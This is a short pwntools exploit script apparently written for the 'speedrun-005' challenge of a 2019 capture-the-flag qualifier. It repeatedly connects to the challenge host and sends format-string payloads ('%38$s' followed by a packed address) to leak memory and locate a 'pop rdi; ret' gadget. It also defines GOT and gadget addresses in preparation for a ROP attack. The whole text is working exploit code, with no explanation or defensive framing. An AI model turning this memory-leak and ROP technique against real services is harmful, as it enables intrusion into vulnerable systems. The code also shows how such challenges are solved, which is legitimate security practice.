#dump the binary & seek the precise address
from pwn import *
context.log_level='debug'
def cal(a,b):
	if (a-b)>0:
		return a-b
	else:
		return a-b+0x10000
def seek(seek,l=0):
	while(1):
		seek=seek+l
		p=remote("speedrun-005.quals2019.oooverflow.io",31337)
		#gdb.attach(p)
		pay="%{}$s".format(38).ljust(0x100,'\x00')+p64(seek)
		p.sendlineafter("? ",pay)
		p.readuntil("ing ")
		data=p.readline()
		l=len(data)
		if "\x5f\xc3" in data:
			raw_input()
		p.close()
def preciser(seek):
	while(1):
		seek=seek+1
		p=remote("speedrun-005.quals2019.oooverflow.io",31337)
		#gdb.attach(p)
		pay="%{}$s".format(38).ljust(0x100,'\x00')+p64(seek)
		p.sendlineafter("? ",pay)
		p.readuntil("ing ")
		data=p.readline()
		if not "\x5f\xc3" in data:
			log.warning(hex(seek))
			raw_input()
		p.close()
#p=process('./speedrun-005')
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
got=0x000000000601020
text=0x40072d
rdi=0x000000000040087d
preciser(rdi)

